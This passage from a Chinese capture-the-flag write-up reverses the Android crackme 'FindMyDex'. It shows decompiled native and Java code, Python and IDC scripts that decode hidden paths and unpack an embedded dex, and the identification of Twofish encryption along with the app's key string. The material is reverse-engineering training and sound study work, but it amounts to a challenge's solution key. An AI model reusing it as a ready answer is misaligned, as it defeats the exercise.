*)&amp;filename[24] = 0x8D87808F;  *(_DWORD *)&amp;filename[28] = 0x8C8D9084;  *(_DWORD *)&amp;filename[32] = 0x808FC691;  *(_DWORD *)&amp;filename[36] = 0xC69A8C85;  *(_DWORD *)&amp;filename[40] = 0x9A88858A;  *(_DWORD *)&amp;filename[44] = 0xC79A8C9A;  *(_DWORD *)&amp;filename[48] = 0xE9918C8D;  filename[52] = 0;  *(_DWORD *)name = 0x9D888DC6;  *(_DWORD *)&amp;name[4] = 0x888DC688;  *(_DWORD *)&amp;name[8] = 0x8AC6889D;  *(_DWORD *)&amp;name[12] = 0x88C78486;  *(_DWORD *)&amp;name[16] = 0x84889AC7;  *(_DWORD *)&amp;name[20] = 0xC78C8599;  *(_DWORD *)&amp;name[24] = 0x8D87808F;  *(_DWORD *)&amp;name[28] = 0x8C8D9084;  *(_DWORD *)&amp;name[32] = 0x808FC691;  *(_DWORD *)&amp;name[36] = 0xC69A8C85;  *(_DWORD *)&amp;name[40] = 0x918C8D86;  name[46] = 0;  i = 1;  *(_WORD *)&amp;name[44] = 0xE9C6u;  filename[0] = 47;  do  {    filename[i] ^= 0xE9u;                       // filename = &#39;/data/data/com.a.sample.findmydex/files/classes.dex&#39;    ++i;  }  while ( i != 53 );  j = 1;  name[0] = 47;  do  {    name[j] ^= 0xE9u;                           // name = &#39;/data/data/com.a.sample.findmydex/files/odex/&#39;    ++j;  }  while ( j != 47 );</code></pre><p>解密一下，可以发现是生成目标 dex 文件和 odex 的路径：</p><pre><code class="python">#!/usr/bin/env pythondef word2bytes(w):    return [w &amp; 0xFF, (w &gt;&gt; 8) &amp; 0xFF, (w &gt;&gt; 16) &amp; 0xFF, w &gt;&gt; 24]def bytes2word(bs):    return bs[0] | bs[1] &lt;&lt; 8 | bs[2] &lt;&lt; 16 | bs[3] &lt;&lt; 24def words2byte(ws):    result = []    for w in ws:        temp = word2bytes(w)        for b in temp:            result.append(b)    return resultdef bytes2words(bs):    result = []    for i in range(len(bs) / 4):        temp = bytes2word(bs[4*i:4*i+4])        result.append(temp)    return resultfilename = [0x9D888DC6, 0x888DC688, 0x8AC6889D, 0x88C78486, 0x84889AC7, 0xC78C8599, 0x8D87808F, 0x8C8D9084, 0x808FC691, 0xC69A8C85, 0x9A88858A, 0xC79A8C9A, 0xE9918C8D]name = [0x9D888DC6, 0x888DC688, 0x8AC6889D, 0x88C78486, 0x84889AC7, 0xC78C8599, 0x8D87808F, 0x8C8D9084, 0x808FC691, 0xC69A8C85, 0x918C8D86, 0x0000E9C6]filename = words2byte(filename)name = words2byte(name)filename = chr(47) + &#39;&#39;.join(list(map(lambda c: chr(c ^ 0xE9), filename[1:])))name = chr(47) + &#39;&#39;.join(list(map(lambda c: chr(c ^ 0xE9), name[1:])))print filename# /data/data/com.a.sample.findmydex/files/classes.dexprint name# /data/data/com.a.sample.findmydex/files/odex/</code></pre><p>然后接下来，可以看到一些涉及到 OpenGL 库的函数：</p><pre><code class="cpp">...  _android_log_print(4, &quot;FindMyDex&quot;, &quot;Can you shake your phone 100 times in 10 seconds?&quot;);  v10 = 0;  do  {    while ( 1 )    {      v12 = 0;      if ( !v30 )        v12 = -1;      v13 = ALooper_pollAll(v12, 0, &amp;v25, &amp;v24);// get time      if ( v13 &gt;= 0 )        break;      if ( v30 )      {        v11 = v31 + 0.01;        if ( (float)(v31 + 0.01) &gt; 1.0 )          v11 = 0.0;        v31 = v11;        sub_2C14((int)&amp;v26);                    // OpenGL      }    }...int __fastcall sub_2C14(int a1){  int v1; // r4  int result; // r0  v1 = a1;  result = *(_DWORD *)(a1 + 20);  if ( !result )    return result;  glClearColor(    (float)*(signed int *)(v1 + 44) / (float)*(signed int *)(v1 + 32),// red    *(GLclampf *)(v1 + 40),                     // green    (float)*(signed int *)(v1 + 48) / (float)*(signed int *)(v1 + 36),// blue    1.0);  glClear(0x4000u);  result = j_eglSwapBuffers(*(_QWORD *)(v1 + 20), *(_QWORD *)(v1 + 20) &gt;&gt; 32);  return result;}</code></pre><p>这部分不去仔细看，可以直接根据 log 来判断程序的流程，可以判断出是要求在 10 秒内摇 100 次手机。在 <code>(times - 1) &lt;= 88</code> 处可以看到开始对数据进行解压缩处理。在后面 <code>times == 100</code>，可以判断是达到了 100 次后，开始对将数据输出到文件中：</p><pre><code class="cpp">...  _android_log_print(4, &quot;FindMyDex&quot;, &quot;Can you shake your phone 100 times in 10 seconds?&quot;);...            _android_log_print(4, &quot;FindMyDex&quot;, &quot;Oh yeah~ You Got it~ %d times to go~&quot;, 99 - v10);...        if ( (unsigned int)(times - 1) &lt;= 88 )        {          v10 = times;          v15 = times / 10;          if ( times % 10 == 9 )          {            v16 = size_1;            v17 = (signed int)size_1 / 10;            v18 = (v15 + 1) * ((signed int)size_1 / 10);            if ( (signed int)size_1 / 10 * v15 &lt; v18 )            {              v19 = &amp;data[v17 * v15];              do              {                --v17;                *v19++ ^= times;              }              while ( v17 );            }            if ( times == 89 )            {              while ( v18 &lt; (signed int)v16 )                data[v18++] ^= 0x59u;            }            v10 = times + 1;          }        }        if ( times == 100 )                     // reach the target        {          if ( (signed int)(time(0) - v6) &gt; 9 )          {            _android_log_print(4, &quot;FindMyDex&quot;, &quot;OH~ You are too slow. Please try again&quot;);            _aeabi_memcpy(data, &amp;data_1, size_1);            v10 = 0;          }          else          {            v20 = v6;            if ( uncompress(dest, &amp;destLen, data, (uLong)size_1) )// uncompress data              _android_log_print(5, &quot;FindMyDex&quot;, &quot;Dangerous operation detected.&quot;);            v21 = open(filename, 577, 511);            if ( !v21 )              _android_log_print(5, &quot;FindMyDex&quot;, &quot;Something wrong with the permission.&quot;);            write(v21, dest, destLen);            close(v21);            free(dest);            free(data);            if ( access(name, 0) &amp;&amp; mkdir(name, 0x1FFu) )              _android_log_print(5, &quot;FindMyDex&quot;, &quot;Something wrong with the permission..&quot;);            sub_2368((int)v1);            remove(filename);            _android_log_print(4, &quot;FindMyDex&quot;, &quot;Congratulations!! You made it!&quot;);            sub_2250(v1);            v10 = 0x80000000;            v6 = v20;          }        }      }    }...</code></pre><p>用 IDC 脚本把数据 dump 下来：</p><pre><code class="cpp">static main() {    auto fp, start, end, len, b;    fp = fopen(&quot;dump.data&quot;, &quot;wb&quot;);    start = 0x7004;    len = 0x3CA10;    end = start + len;    for (b = start; b &lt; end; b++) {        fputc(Byte(b), fp);    }}</code></pre><p>然后实现一下对 dex 文件的解压缩过程：</p><pre><code class="python">#!/usr/bin/env pythonimport zlibwith open(&#39;dump.data&#39;, &#39;rb&#39;) as f:    data = f.read()data = [ord(c) for c in data]size = 0x3CA10for times in range(90):    v15 = times / 10    if times % 10 == 9:        v16 = size        v17 = size / 10        v18 = (v15 + 1) * (size / 10)        if size / 10 * v15 &lt; v18:            for i in range(v17):                data[v17 * v15 + i] ^= times        if times == 89:            while v18 - v16 &lt; 0:                data[v18] ^= 0x59                v18 += 1data = &#39;&#39;.join([chr(c) for c in data])data = zlib.decompress(data)with open(&#39;dump.dex&#39;, &#39;wb&#39;) as f:    for c in data:        f.write(c)</code></pre><p>接下来用 JEB 对 dex 文件进行分析。首先在 MainActivity 中，变量 m 是密文，onCreate 中调用了 a 类。函数 b 则是一个加密函数，其中涉及到了 b 类中函数：</p><pre><code class="java">package com.a.sample.findmydex;import android.content.Context;import android.os.Bundle;import android.support.v7.a.u;import java.io.BufferedInputStream;import java.io.ByteArrayInputStream;import java.nio.ByteBuffer;import java.util.ArrayList;public class MainActivity extends u {    private static byte[] m;    static {        MainActivity.m = new byte[]{-120, 77, -14, -38, 17, 5, -42, 44, -32, 109, 85, 0x1F, 24, -91, -112, -83, 0x40, -83, -128, 84, 5, -94, -98, -30, 18, 70, -26, 71, 5, -99, -62, -58, 0x75, 29, -44, 6, 0x70, -4, 81, 84, 9, 22, -51, 0x5F, -34, 12, 0x2F, 77};    }    public MainActivity() {        super();    }    static byte[] a(String arg1, String arg2) {        return MainActivity.b(arg1, arg2);    }    private static byte[] b(String arg7, String arg8) {        byte[] v0_1;        try {            BufferedInputStream v2 = new BufferedInputStream(new ByteArrayInputStream(arg7.getBytes()));            byte[] v1 = new byte[16];            ArrayList v3 = new ArrayList();            Object v4 = b.a(arg8.getBytes()); // 处理密钥            while(v2.read(v1, 0, 16) != -1) { // 循环加密，采用ECB模式                v3.add(b.a(v1, 0, v4));                v1 = new byte[16];            }            ByteBuffer v2_1 = ByteBuffer.allocate(v3.size() * 16); // 转换成字节数组            Object[] v3_1 = v3.toArray();            int v4_1 = v3_1.length;            int v1_1;            for(v1_1 = 0; v1_1 &lt; v4_1; ++v1_1) {                v2_1.put(v3_1[v1_1]);            }            v0_1 = v2_1.array();        }        catch(Exception v0) {            v0_1 = new byte[1];        }        return v0_1;    }    static byte[] i() { // Cipheretxt        return MainActivity.m;    }    protected void onCreate(Bundle arg4) {        super.onCreate(arg4);        this.setContentView(0x7F04001A); // activity_main        this.findViewById(0x7F0B0055).setOnClickListener(new a(this, this.findViewById(0x7F0B0054), ((Context)this))); // button | edit_text    }}</code></pre><p>类 a 中设置了一个监听按钮的事件，并将输入和指定的字符串作为参数传入 MainActivity 的函数 a。并与密文进行比较：</p><pre><code class="java">package com.a.sample.findmydex;import android.content.Context;import android.view.View$OnClickListener;import android.view.View;import android.widget.EditText;import android.widget.Toast;import java.util.Arrays;class a implements View$OnClickListener {    a(MainActivity arg1, EditText arg2, Context arg3) {        this.c = arg1;        this.a = arg2;        this.b = arg3;        super();    }    public void onClick(View arg5) {        if(Arrays.equals(MainActivity.a(this.a.getText().toString(), this.c.getString(0x7F060023)), MainActivity.i())) { // I have a male fish and a female fish.            Toast.makeText(this.b, this.c.getString(0x7F060025), 1).show(); // Yes! You got me! :)        }        else {            Toast.makeText(this.b, this.c.getString(0x7F060022), 1).show(); // NO~ You don&#39;t get me~ T_T        }    }}</code></pre><p>b 类的 a 函数主要将数组的长度补齐成 8 的倍数，并调用 b 函数：</p><pre><code class="java">    public static Object a(byte[] arg5) { // 补齐块        Object v0_3;        int v1 = 0x20;        int v0 = 0;        Class v2 = b.class;        __monitor_enter(v2);        try {            if(arg5.length &gt; v1 || arg5.length % 8 != 0) { // 长度大于32或不是8的倍数                if(arg5.length &lt;= v1) {                    v1 = arg5.length;                }                if((v1 &amp; 7) &gt; 0) { // 判断数组长度是否是8的倍数，不是的话补齐                    v0 = 1;                }                byte[] v0_2 = new byte[v0 * 8 + v1];                System.arraycopy(arg5, 0, v0_2, 0, v1);                arg5 = v0_2;            }            v0_3 = b.b(arg5);        }        catch(Throwable v0_1) {            __monitor_exit(v2);            throw v0_1;        }        __monitor_exit(v2);        return v0_3;    }</code></pre><p>b 类中的 b 函数是一个处理密钥的函数：</p><pre><code class="java">    private static Object b(byte[] arg19) { // 处理密钥        Object[] v1_2;        int[] v13;        int v10_1;        int v9_1;        int v8_1;        int[] v11_1;        int v12;        int v3;        int v1_1;        int v5;        int v4;        Class v6 = b.class;        __monitor_enter(v6);        if(arg19 != null) {            goto label_10;        }        try {            throw new InvalidKeyException(&quot;Empty key&quot;);        label_10:            v4 = arg19.length;            if(v4 != 8 &amp;&amp; v4 != 16 &amp;&amp; v4 != 24 &amp;&amp; v4 != 0x20) {                throw new InvalidKeyException(&quot;Incorrect key length&quot;);            }            int v7 = v4 / 8;            v5 = 40;            int[] v8 = new int[4];            int[] v9 = new int[4];            int[] v10 = new int[4];            v1_1 = 0;            v3 = 0;            int v2;            for(v2 = v7 - 1; v3 &lt; 4; --v2) {                if(v1_1 &gt;= v4) {                    break;                }                int v11 = v1_1 + 1;                v12 = v11 + 1;                v1_1 = arg19[v1_1] &amp; 0xFF | (arg19[v11] &amp; 0xFF) &lt;&lt; 8;                v11 = v12 + 1;                v1_1 |= (arg19[v12] &amp; 0xFF) &lt;&lt; 16;                v12 = v11 + 1;                v8[v3] = v1_1 | (arg19[v11] &amp; 0xFF) &lt;&lt; 24;                v1_1 = v12 + 1;                v11 = arg19[v12] &amp; 0xFF;                v12 = v1_1 + 1;                v1_1 = (arg19[v1_1] &amp; 0xFF) &lt;&lt; 8 | v11;                v11 = v12 + 1;                v12 = (arg19[v12] &amp; 0xFF) &lt;&lt; 16 | v1_1;                v1_1 = v11 + 1;                v9[v3] = (arg19[v11] &amp; 0xFF) &lt;&lt; 24 | v12;                v10[v2] = b.a(v8[v3], v9[v3]);                ++v3;            }            v11_1 = new int[v5];            v1_1 = 0;            v2 = 0;            while(v2 &lt; 20) {                v3 = b.a(v7, v1_1, v8);                v4 = b.a(v7, 0x1010101 + v1_1, v9);                v4 = v4 &gt;&gt;&gt; 24 | v4 &lt;&lt; 8;                v3 += v4;                v11_1[v2 * 2] = v3;                v3 += v4;                v11_1[v2 * 2 + 1] = v3 &gt;&gt;&gt; 23 | v3 &lt;&lt; 9;                ++v2;                v1_1 += 0x2020202;            }            v8_1 = v10[0];            v9_1 = v10[1];            v12 = v10[2];            v10_1 = v10[3];            v13 = new int[0x400];            v2 = 0;            while(true) {            label_120:                if(v2 &gt;= 0x100) {                    goto label_324;                }                switch(v7 &amp; 3) {                    case 0: {                        goto label_183;                    }                    case 1: {                        goto label_126;                    }                    case 2: {                        goto label_332;                    }                    case 3: {                        goto label_337;                    }                }                goto label_124;            }        }        catch(Throwable v1) {            goto label_8;        }    label_337:        v1_1 = v2;        v3 = v2;        v4 = v2;        v5 = v2;        goto label_211;        try {        label_183:            v5 = b.a[1][v2] &amp; 0xFF ^ b.e(v10_1);            v4 = b.a[0][v2] &amp; 0xFF ^ b.f(v10_1);            v3 = b.g(v10_1) ^ b.a[0][v2] &amp; 0xFF;            v1_1 = b.a[1][v2] &amp; 0xFF ^ b.h(v10_1);        label_211:            v5 = b.a[1][v5] &amp; 0xFF ^ b.e(v12);            v4 = b.a[1][v4] &amp; 0xFF ^ b.f(v12);            v3 = b.a[0][v3] &amp; 0xFF ^ b.g(v12);            v1_1 = b.a[0][v1_1] &amp; 0xFF ^ b.h(v12);            goto label_239;        }        catch(Throwable v1) {            goto label_8;        }    label_332:        v1_1 = v2;        v3 = v2;        v4 = v2;        v5 = v2;        try {        label_239:            v13[v2 * 2] = b.b[0][b.a[0][b.a[0][v5] &amp; 0xFF ^ b.e(v9_1)] &amp; 0xFF ^ b.e(v8_1)];            v13[v2 * 2 + 1] = b.b[1][b.a[0][b.a[1][v4] &amp; 0xFF ^ b.f(v9_1)] &amp; 0xFF ^ b.f(v8_1)];            v13[v2 * 2 + 0x200] = b.b[2][b.a[1][b.a[0][v3] &amp; 0xFF ^ b.g(v9_1)] &amp; 0xFF ^ b.g(v8_1)];            v13[v2 * 2 + 0x201] = b.b[3][b.a[1][b.a[1][v1_1] &amp; 0xFF ^ b.h(v9_1)] &amp; 0xFF ^ b.h(v8_1)];            goto label_124;        label_126:            v13[v2 * 2] = b.b[0][b.a[0][v2] &amp; 0xFF ^ b.e(v8_1)];            v13[v2 * 2 + 1] = b.b[1][b.a[0][v2] &amp; 0xFF ^ b.f(v8_1)];            v13[v2 * 2 + 0x200] = b.b[2][b.a[1][v2] &amp; 0xFF ^ b.g(v8_1)];            v13[v2 * 2 + 0x201] = b.b[3][b.a[1][v2] &amp; 0xFF ^ b.h(v8_1)];        label_124:            ++v2;            goto label_120;        label_324:            v1_2 = new Object[]{v13, v11_1};        }        catch(Throwable v1) {            goto label_8;        }        __monitor_exit(v6);        return v1_2;    label_8:        __monitor_exit(v6);        throw v1;    }</code></pre><p>这个 a 函数判断传入的字节数组、、密钥都不为空，并调用 b 函数：</p><pre><code class="java">    public static byte[] a(byte[] arg1, int arg2, Object arg3) {        byte[] v0 = arg1 == null || arg3 == null || arg2 &lt; 0 ? null : b.b(arg1, arg2, arg3);        return v0;    }</code></pre><p>b 函数应该就是对数据的加密过程，明显是个 16 次轮函数的分组密码：</p><pre><code class="java">    private static byte[] b(byte[] arg12, int arg13, Object arg14) {        int[] v0 = arg14[0];        Object v1 = arg14[1];        int v2 = arg13 + 1;        int v4 = v2 + 1;        int v3 = v4 + 1;        v2 = (arg12[v2] &amp; 0xFF) &lt;&lt; 8 | arg12[arg13] &amp; 0xFF | (arg12[v4] &amp; 0xFF) &lt;&lt; 16;        v4 = v3 + 1;        v2 |= (arg12[v3] &amp; 0xFF) &lt;&lt; 24;        v3 = v4 + 1;        int v5 = v3 + 1;        v3 = (arg12[v3] &amp; 0xFF) &lt;&lt; 8 | arg12[v4] &amp; 0xFF;        v4 = v5 + 1;        v3 |= (arg12[v5] &amp; 0xFF) &lt;&lt; 16;        v5 = v4 + 1;        v3 |= (arg12[v4] &amp; 0xFF) &lt;&lt; 24;        v4 = v5 + 1;        int v6 = v4 + 1;        v4 = (arg12[v4] &amp; 0xFF) &lt;&lt; 8 | arg12[v5] &amp; 0xFF;        v5 = v6 + 1;        v4 |= (arg12[v6] &amp; 0xFF) &lt;&lt; 16;        v6 = v5 + 1;        v4 |= (arg12[v5] &amp; 0xFF) &lt;&lt; 24;        v5 = v6 + 1;        int v7 = v5 + 1;        int v8 = (arg12[v5] &amp; 0xFF) &lt;&lt; 8 | arg12[v6] &amp; 0xFF | (arg12[v7] &amp; 0xFF) &lt;&lt; 16 | (arg12[v7 + 1] &amp; 0xFF) &lt;&lt; 24;        v7 = v2 ^ v1[0];        v6 = v3 ^ v1[1];        v5 = v4 ^ v1[2];        v4 = v8 ^ v1[3];        v3 = 8;        for(v2 = 0; v2 &lt; 16; v2 += 2) {            v8 = b.a(v0, v7, 0);            int v9 = b.a(v0, v6, 3);            int v11 = v3 + 1;            v3 = v1[v3] + (v8 + v9) ^ v5;            v5 = v3 &gt;&gt;&gt; 1 | v3 &lt;&lt; 0x1F;            v3 = v4 &lt;&lt; 1 | v4 &gt;&gt;&gt; 0x1F;            v4 = v9 * 2 + v8;            v8 = v11 + 1;            v4 = v4 + v1[v11] ^ v3;            v3 = b.a(v0, v5, 0);            v9 = b.a(v0, v4, 3);            v11 = v8 + 1;            v7 ^= v1[v8] + (v3 + v9);            v7 = v7 &lt;&lt; 0x1F | v7 &gt;&gt;&gt; 1;            v8 = v9 * 2 + v3;            v3 = v11 + 1;            v6 = (v6 &gt;&gt;&gt; 0x1F | v6 &lt;&lt; 1) ^ v8 + v1[v11];        }        int v0_1 = v1[4] ^ v5;        v2 = v1[5] ^ v4;        v3 = v1[6] ^ v7;        int v1_1 = v1[7] ^ v6;        return new byte[]{((byte)v0_1), ((byte)(v0_1 &gt;&gt;&gt; 8)), ((byte)(v0_1 &gt;&gt;&gt; 16)), ((byte)(v0_1 &gt;&gt;&gt; 24)), ((byte)v2), ((byte)(v2 &gt;&gt;&gt; 8)), ((byte)(v2 &gt;&gt;&gt; 16)), ((byte)(v2 &gt;&gt;&gt; 24)), ((byte)v3), ((byte)(v3 &gt;&gt;&gt; 8)), ((byte)(v3 &gt;&gt;&gt; 16)), ((byte)(v3 &gt;&gt;&gt; 24)), ((byte)v1_1), ((byte)(v1_1 &gt;&gt;&gt; 8)), ((byte)(v1_1 &gt;&gt;&gt; 16)), ((byte)(v1_1 &gt;&gt;&gt; 24))};    }</code></pre><p>分组密码可以去找一下特征，看到了 b 类的头上定义了两个数据，转成 16 进制之后拿去搜一下：</p><pre><code class="java">        v0[0] = new byte[]{-87, 103, -77, -24, 4, -3, -93, 0x76, -102, -110, -128, 120, -28, -35, -47, 56, 13, -58, 53, -104, 24, -9, -20, 108, 67, 0x75, 55, 38, -6, 19, -108, 72, -14, -48, -117, 0x30, -124, 84, -33, 35, 25, 91, 61, 89, -13, -82, -94, -126, 99, 1, -125, 46, -39, 81, -101, 0x7C, -90, -21, -91, -66, 22, 12, -29, 97, -64, -116, 58, -11, 0x73, 44, 37, 11, -69, 78, -119, 107, 83, 106, -76, -15, -31, -26, -67, 69, -30, -12, -74, 102, -52, -107, 3, 86, -44, 28, 30, -41, -5, -61, -114, -75, -23, -49, -65, -70, -22, 0x77, 57, -81, 51, -55, 98, 0x71, -127, 0x79, 9, -83, 36, -51, -7, -40, -27, -59, -71, 77, 68, 8, -122, -25, -95, 29, -86, -19, 6, 0x70, -78, -46, 65, 0x7B, -96, 17, 49, -62, 39, -112, 0x20, -10, 0x60, -1, -106, 92, -79, -85, -98, -100, 82, 27, 0x5F, -109, 10, -17, -111, -123, 73, -18, 45, 0x4F, -113, 59, 71, -121, 109, 70, -42, 62, 105, 100, 42, -50, -53, 0x2F, -4, -105, 5, 0x7A, -84, 0x7F, -43, 26, 75, 14, -89, 90, 40, 20, 0x3F, 41, -120, 60, 76, 2, -72, -38, -80, 23, 85, 0x1F, -118, 0x7D, 87, -57, -115, 0x74, -73, -60, -97, 0x72, 0x7E, 21, 34, 18, 88, 7, -103, 52, 110, 80, -34, 104, 101, -68, -37, -8, -56, -88, 43, 0x40, -36, -2, 50, -92, -54, 16, 33, -16, -45, 93, 15, 0, 0x6F, -99, 54, 66, 74, 94, -63, -32}; // 0xA9, 0x67, 0xB3, 0xE8, 0x04, 0xFD, 0xA3, 0x76, 0x9A, 0x92, 0x80, 0x78, 0xE4, 0xDD, 0xD1, 0x38, 0x0D, 0xC6, 0x35, 0x98, 0x18, 0xF7, 0xEC, 0x6C, 0x43, 0x75, 0x37, 0x26, 0xFA, 0x13, 0x94, 0x48, 0xF2, 0xD0, 0x8B, 0x30, 0x84, 0x54, 0xDF, 0x23, 0x19, 0x5B, 0x3D, 0x59, 0xF3, 0xAE, 0xA2, 0x82, 0x63, 0x01, 0x83, 0x2E, 0xD9, 0x51, 0x9B, 0x7C, 0xA6, 0xEB, 0xA5, 0xBE, 0x16, 0x0C, 0xE3, 0x61, 0xC0, 0x8C, 0x3A, 0xF5, 0x73, 0x2C, 0x25, 0x0B, 0xBB, 0x4E, 0x89, 0x6B, 0x53, 0x6A, 0xB4, 0xF1, 0xE1, 0xE6, 0xBD, 0x45, 0xE2, 0xF4, 0xB6, 0x66, 0xCC, 0x95, 0x03, 0x56, 0xD4, 0x1C, 0x1E, 0xD7, 0xFB, 0xC3, 0x8E, 0xB5, 0xE9, 0xCF, 0xBF, 0xBA, 0xEA, 0x77, 0x39, 0xAF, 0x33, 0xC9, 0x62, 0x71, 0x81, 0x79, 0x09, 0xAD, 0x24, 0xCD, 0xF9, 0xD8, 0xE5, 0xC5, 0xB9, 0x4D, 0x44, 0x08, 0x86, 0xE7, 0xA1, 0x1D, 0xAA, 0xED, 0x06, 0x70, 0xB2, 0xD2, 0x41, 0x7B, 0xA0, 0x11, 0x31, 0xC2, 0x27, 0x90, 0x20, 0xF6, 0x60, 0xFF, 0x96, 0x5C, 0xB1, 0xAB, 0x9E, 0x9C, 0x52, 0x1B, 0x5F, 0x93, 0x0A, 0xEF, 0x91, 0x85, 0x49, 0xEE, 0x2D, 0x4F, 0x8F, 0x3B, 0x47, 0x87, 0x6D, 0x46, 0xD6, 0x3E, 0x69, 0x64, 0x2A, 0xCE, 0xCB, 0x2F, 0xFC, 0x97, 0x05, 0x7A, 0xAC, 0x7F, 0xD5, 0x1A, 0x4B, 0x0E, 0xA7, 0x5A, 0x28, 0x14, 0x3F, 0x29, 0x88, 0x3C, 0x4C, 0x02, 0xB8, 0xDA, 0xB0, 0x17, 0x55, 0x1F, 0x8A, 0x7D, 0x57, 0xC7, 0x8D, 0x74, 0xB7, 0xC4, 0x9F, 0x72, 0x7E, 0x15, 0x22, 0x12, 0x58, 0x07, 0x99, 0x34, 0x6E, 0x50, 0xDE, 0x68, 0x65, 0xBC, 0xDB, 0xF8, 0xC8, 0xA8, 0x2B, 0x40, 0xDC, 0xFE, 0x32, 0xA4, 0xCA, 0x10, 0x21, 0xF0, 0xD3, 0x5D, 0x0F, 0x00, 0x6F, 0x9D, 0x36, 0x42, 0x4A, 0x5E, 0xC1, 0xE0        v0[1] = new byte[]{0x75, -13, -58, -12, -37, 0x7B, -5, -56, 74, -45, -26, 107, 69, 0x7D, -24, 75, -42, 50, -40, -3, 55, 0x71, -15, -31, 0x30, 15, -8, 27, -121, -6, 6, 0x3F, 94, -70, -82, 91, -118, 0, -68, -99, 109, -63, -79, 14, -128, 93, -46, -43, -96, -124, 7, 20, -75, -112, 44, -93, -78, 0x73, 76, 84, -110, 0x74, 54, 81, 56, -80, -67, 90, -4, 0x60, 98, -106, 108, 66, -9, 16, 0x7C, 40, 39, -116, 19, -107, -100, -57, 36, 70, 59, 0x70, -54, -29, -123, -53, 17, -48, -109, -72, -90, -125, 0x20, -1, -97, 0x77, -61, -52, 3, 0x6F, 8, -65, 0x40, -25, 43, -30, 0x79, 12, -86, -126, 65, 58, -22, -71, -28, -102, -92, -105, 0x7E, -38, 0x7A, 23, 102, -108, -95, 29, 61, -16, -34, -77, 11, 0x72, -89, 28, -17, -47, 83, 62, -113, 51, 38, 0x5F, -20, 0x76, 42, 73, -127, -120, -18, 33, -60, 26, -21, -39, -59, 57, -103, -51, -83, 49, -117, 1, 24, 35, -35, 0x1F, 78, 45, -7, 72, 0x4F, -14, 101, -114, 120, 92, 88, 25, -115, -27, -104, 87, 103, 0x7F, 5, 100, -81, 99, -74, -2, -11, -73, 60, -91, -50, -23, 104, 68, -32, 77, 67, 105, 41, 46, -84, 21, 89, -88, 10, -98, 110, 71, -33, 52, 53, 106, -49, -36, 34, -55, -64, -101, -119, -44, -19, -85, 18, -94, 13, 82, -69, 2, 0x2F, -87, -41, 97, 30, -76, 80, 4, -10, -62, 22, 37, -122, 86, 85, 9, -66, -111}; // 0x75, 0xF3, 0xC6, 0xF4, 0xDB, 0x7B, 0xFB, 0xC8, 0x4A, 0xD3, 0xE6, 0x6B, 0x45, 0x7D, 0xE8, 0x4B, 0xD6, 0x32, 0xD8, 0xFD, 0x37, 0x71, 0xF1, 0xE1, 0x30, 0x0F, 0xF8, 0x1B, 0x87, 0xFA, 0x06, 0x3F, 0x5E, 0xBA, 0xAE, 0x5B, 0x8A, 0x00, 0xBC, 0x9D, 0x6D, 0xC1, 0xB1, 0x0E, 0x80, 0x5D, 0xD2, 0xD5, 0xA0, 0x84, 0x07, 0x14, 0xB5, 0x90, 0x2C, 0xA3, 0xB2, 0x73, 0x4C, 0x54, 0x92, 0x74, 0x36, 0x51, 0x38, 0xB0, 0xBD, 0x5A, 0xFC, 0x60, 0x62, 0x96, 0x6C, 0x42, 0xF7, 0x10, 0x7C, 0x28, 0x27, 0x8C, 0x13, 0x95, 0x9C, 0xC7, 0x24, 0x46, 0x3B, 0x70, 0xCA, 0xE3, 0x85, 0xCB, 0x11, 0xD0, 0x93, 0xB8, 0xA6, 0x83, 0x20, 0xFF, 0x9F, 0x77, 0xC3, 0xCC, 0x03, 0x6F, 0x08, 0xBF, 0x40, 0xE7, 0x2B, 0xE2, 0x79, 0x0C, 0xAA, 0x82, 0x41, 0x3A, 0xEA, 0xB9, 0xE4, 0x9A, 0xA4, 0x97, 0x7E, 0xDA, 0x7A, 0x17, 0x66, 0x94, 0xA1, 0x1D, 0x3D, 0xF0, 0xDE, 0xB3, 0x0B, 0x72, 0xA7, 0x1C, 0xEF, 0xD1, 0x53, 0x3E, 0x8F, 0x33, 0x26, 0x5F, 0xEC, 0x76, 0x2A, 0x49, 0x81, 0x88, 0xEE, 0x21, 0xC4, 0x1A, 0xEB, 0xD9, 0xC5, 0x39, 0x99, 0xCD, 0xAD, 0x31, 0x8B, 0x01, 0x18, 0x23, 0xDD, 0x1F, 0x4E, 0x2D, 0xF9, 0x48, 0x4F, 0xF2, 0x65, 0x8E, 0x78, 0x5C, 0x58, 0x19, 0x8D, 0xE5, 0x98, 0x57, 0x67, 0x7F, 0x05, 0x64, 0xAF, 0x63, 0xB6, 0xFE, 0xF5, 0xB7, 0x3C, 0xA5, 0xCE, 0xE9, 0x68, 0x44, 0xE0, 0x4D, 0x43, 0x69, 0x29, 0x2E, 0xAC, 0x15, 0x59, 0xA8, 0x0A, 0x9E, 0x6E, 0x47, 0xDF, 0x34, 0x35, 0x6A, 0xCF, 0xDC, 0x22, 0xC9, 0xC0, 0x9B, 0x89, 0xD4, 0xED, 0xAB, 0x12, 0xA2, 0x0D, 0x52, 0xBB, 0x02, 0x2F, 0xA9, 0xD7, 0x61, 0x1E, 0xB4, 0x50, 0x04, 0xF6, 0xC2, 0x16, 0x25, 0x86, 0x56, 0x55, 0x09, 0xBE, 0x91</code></pre><p>发现是 twofish 算法：</p><p><img src="/pics/攻防世界-MOBILE-新手练习区/2.png" srcset="/img/loading.gif" alt></p><p>上面的一些资源可以在 Resources/values/public.xml 中找到 ID 对应的字符串名：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;resources&gt;  ...  &lt;public id=&quot;0x7f04001a&quot; name=&quot;activity_main&quot; type=&quot;layout&quot; /&gt;  ...  &lt;public id=&quot;0x7f060022&quot; name=&quot;no&quot; type=&quot;string&quot; /&gt;  &lt;public id=&quot;0x7f060023&quot; name=&quot;two_fish&quot; type=&quot;string&quot; /&gt;  ...  &lt;public id=&quot;0x7f060025&quot; name=&quot;yes&quot; type=&quot;string&quot; /&gt;  ...  &lt;public id=&quot;0x7f0b0054&quot; name=&quot;edit_text&quot; type=&quot;id&quot; /&gt;  &lt;public id=&quot;0x7f0b0055&quot; name=&quot;button&quot; type=&quot;id&quot; /&gt;  ...&lt;/resources&gt;</code></pre><p>可以在 Resources/values/strings.xml 中找到对应的字符串：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;resources&gt;  ...  &lt;string name=&quot;no&quot;&gt;    NO~ You don&#39;t get me~ T_T&lt;/string&gt;  &lt;string name=&quot;two_fish&quot;&gt;    I have a male fish and a female fish.&lt;/string&gt;  &lt;string name=&quot;what_else&quot;&gt;    What else?&lt;/string&gt;  &lt;string 